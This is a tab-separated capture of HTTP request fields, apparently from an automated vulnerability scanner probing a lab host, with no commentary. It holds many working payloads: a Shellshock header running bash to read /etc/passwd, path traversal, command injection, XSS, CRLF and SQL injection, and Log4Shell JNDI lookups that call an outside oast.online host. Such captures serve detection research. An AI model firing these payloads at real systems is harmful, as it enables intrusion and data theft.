http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/webadmin/authportal/bounce.php?url=https://example.com/		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/webadmin/authportal/bounce.php?url=https://example.com/
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/cgi-bin/jarrewrite.sh		GET				HTTP/1.1																			"() { :; }; echo ; /bin/bash -c 'cat /etc/passwd'"				/web/cgi-bin/jarrewrite.sh
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../c:/windows/win.ini		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../c:/windows/win.ini
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/%5C%5Cexample.com/%252e%252e%252f		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/%5C%5Cexample.com/%252e%252e%252f
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/main/blank?message_error=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/main/blank?message_error=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(xss)%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(xss)%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/rest/api/2/project?maxResults=100		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/rest/api/2/project?maxResults=100
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/123contactform-for-wordpress/		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/wp-content/plugins/123contactform-for-wordpress/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip																close		116	116							192.168.1.104														http://192.168.1.104/web	1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=/etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=/etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-config.old		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/wp-config.old
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web///../app.js		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web///../app.js
*/*	gzip	en															close		20	20							192.168.1.104															1	http://192.168.1.104/web/fileDownload?action=downloadBackupFile		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/fileDownload?action=downloadBackupFile
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/loyalty_enu/start.swe/%3E%22%3E%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/loyalty_enu/start.swe/%3E%22%3E%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/%5Cexample.com		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/%5Cexample.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/monitoring?part=graph&graph=usedMemory%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/monitoring?part=graph&graph=usedMemory%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/plus/carbuyaction.php?dopost=return&code=../../		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36			code=cod	/web/plus/carbuyaction.php?dopost=return&code=../../
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/_ignition/scripts/--%3E%3Csvg%20onload=alert%28document.domain%29%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/_ignition/scripts/--%3E%3Csvg%20onload=alert%28document.domain%29%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/kvmlm2/index.dhtml?fname=&language=../../../../../../../../../../etc/passwd%00.jpg&lname=&sponsor=gdi&template=11		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/kvmlm2/index.dhtml?fname=&language=../../../../../../../../../../etc/passwd%00.jpg&lname=&sponsor=gdi&template=11
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/bitrix/rk.php?goto=https://example.com		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/bitrix/rk.php?goto=https://example.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/Attitude/go.php?https://example.com/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/wp-content/themes/Attitude/go.php?https://example.com/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/scripts/logdownload.php?dlfilename=juicyinfo.txt&path=../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/scripts/logdownload.php?dlfilename=juicyinfo.txt&path=../../../../../../../../etc/passwd
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3	gzip	tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7															close										192.168.1.104															1	http://192.168.1.104/web/../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/../../../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-config.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/wp-config.txt
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/ueditor/net/controller.ashx?action=catchimage&encode=utf-8		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/ueditor/net/controller.ashx?action=catchimage&encode=utf-8
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/rest/V1/products		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/rest/V1/products
application/json, text/plain, */*	gzip																close		20	20	application/x-www-form-urlencoded; charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/fileDownload?action=downloadBackupFile		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/fileDownload?action=downloadBackupFile
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.c8acjap9m8v98g1htghgcekcuoyyyyync.oast.online/a%7D		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.c8acjap9m8v98g1htghgcekcuoyyyyync.oast.online/a%7D
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/uploads/mc4wp-debug.log		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/wp-content/uploads/mc4wp-debug.log
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/?{alert(1)}		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/?{alert(1)}
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/bitrix/redirect.php?event1=&event2=&event3=&goto=https://example.com		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/bitrix/redirect.php?event1=&event2=&event3=&goto=https://example.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=crlfinjection		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=crlfinjection
application/json, text/javascript, */*; q=0.01	gzip																close										192.168.1.104														http://192.168.1.104/web	1	http://192.168.1.104/web/api/system/deviceinfo		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/api/system/deviceinfo
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPlugin/slideshow.php?randomId=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPlugin/slideshow.php?randomId=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/%0DSet-Cookie:crlfinjection=crlfinjection		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/%0DSet-Cookie:crlfinjection=crlfinjection
	gzip																close		167	167	application/x-www-form-urlencoded						192.168.1.104														192.168.1.104/MUP	1	http://192.168.1.104/web/MUP/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/MUP/
*/*	gzip	en															close		56	56	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/index.php		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/index.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php/Home/uploadify/fileList?type=.+&path=../../../		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/index.php/Home/uploadify/fileList?type=.+&path=../../../
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/%61%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e		GET				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/%61%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?id=50&file=../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/index.php?id=50&file=../../../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=test")		GET				and extractvalue(1,concat(0x7e,md5(1234567890))) -- a HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=test")
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
application/json, text/plain, */*	gzip																close		2771	2771	multipart/form-data; boundary=----WebKitFormBoundaryreButJNjkCniQExX						192.168.1.104															1	http://192.168.1.104/web/plugin/add		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/plugin/add
	gzip																close		363	363	application/json						192.168.1.104															1	http://192.168.1.104/web/actuator/env		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/actuator/env
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/xml/User/User.xml		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/xml/User/User.xml
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-config.php.txt		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/wp-config.php.txt
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/wpmudev-updates/keys/		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/wp-content/plugins/wpmudev-updates/keys/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../c:/windows/win.ini		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../c:/windows/win.ini
	gzip																close		132	132	application/x-www-form-urlencoded						192.168.1.104														192.168.1.104/thruk/cgi-bin/login.cgi?thruk	1	http://192.168.1.104/web/thruk/cgi-bin/login.cgi		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/thruk/cgi-bin/login.cgi
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=		GET				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/webadmin/authportal/bounce.php?url=https://example.com/		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/webadmin/authportal/bounce.php?url=https://example.com/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/wordpress-popup/views/admin/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/wp-content/plugins/wordpress-popup/views/admin/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/email-subscribers		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/wp-content/plugins/email-subscribers
	gzip																close		31	31	application/json						192.168.1.104															1	http://192.168.1.104/web/plugin/customMethod		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/plugin/customMethod
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://c8acjap9m8v98g1htghgcekcuoeyyyynq.oast.online%23.salesforce.com/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://c8acjap9m8v98g1htghgcekcuoeyyyynq.oast.online%23.salesforce.com/
*/*	gzip																close		119	119	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/boardDataWW.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/boardDataWW.php
*/*	gzip	en															close		20	20							192.168.1.104															1	http://192.168.1.104/web/fileDownload?action=downloadBackupFile		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/fileDownload?action=downloadBackupFile
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/%5Cexample.com		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/%5Cexample.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/webadmin/reporter/view_server_log.php?server=localhost&act=stats&filename=&offset=1&count=1000&sortorder=&log=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&offset=&sortitem=&filter=		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/webadmin/reporter/view_server_log.php?server=localhost&act=stats&filename=&offset=1&count=1000&sortorder=&log=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&offset=&sortitem=&filter=
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/resin-doc/viewfile/?file=/WEB-INF/resin-web.xml		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/resin-doc/viewfile/?file=/WEB-INF/resin-web.xml
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/overview.asp		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/overview.asp
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.c8acjap9m8v98g1htghgcekcuoyyyyync.oast.online/a%7D		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.c8acjap9m8v98g1htghgcekcuoyyyyync.oast.online/a%7D
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/rest/V1/products		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/rest/V1/products
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/sniplets/view/sniplets/warning.php?text=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/wp-content/plugins/sniplets/view/sniplets/warning.php?text=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/%5cexample.com/%2f%2e%2e		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/%5cexample.com/%2f%2e%2e
